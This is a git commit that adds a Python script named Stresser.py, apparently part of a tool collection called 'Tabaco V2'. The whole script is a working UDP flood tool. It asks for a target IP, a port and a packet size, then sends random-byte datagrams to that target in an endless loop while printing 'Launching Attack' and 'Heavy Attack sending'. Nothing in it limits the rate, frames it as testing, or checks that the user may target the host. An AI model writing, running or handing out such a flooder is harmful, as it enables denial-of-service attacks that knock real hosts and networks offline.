b362b2a0f9d5f43bac486d89b6c34c0b2338c57f
GoobGub <129594730+GoobGub@users.noreply.github.com>
2023-05-12 18:32:55 +0930

    Add files via upload

---
+++ Tabaco V2/Tools/Stresser.py
@@ -0,0 +1,47 @@
+import sys
+import os
+import random
+import socket
+
+
+
+os.system('cls')
+
+print("\033[1;32m")
+
+connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+print("Monkey")
+  
+
+try:
+    size = int(input("Size> "))
+    attack = random._urandom(size)
+    ip = input("IP> ")
+    port = int(input("port> "))
+    print(" ")
+    print("Launching Attack")
+    print(" ")
+except SyntaxError:
+    print(" ")
+    exit("\033[1;34m ERROR \033[1;m")
+except NameError:
+    print(" ")
+    exit("\033[1;34m Invalid Input \033[1;m")
+except KeyboardInterrupt:
+    print(" ")
+    exit("\033[1;34m [-]Canceled By User \033[1;m")
+except ImportError:
+    print(" ")
+    exit("\033[1;34m [-]Install python 2.7.15")
+
+
+while True:
+    try:
+        connect.sendto(attack, (ip, port))
+        print(" Heavy Attack sending  ===>")
+    except KeyboardInterrupt:
+        print(" ")
+        exit("\033[1;34m [-]Canceled By User \033[1;m")
+    except ImportError:
+        print(" ")
+        exit("\033[1;34m [-]Install python 2.7.15")
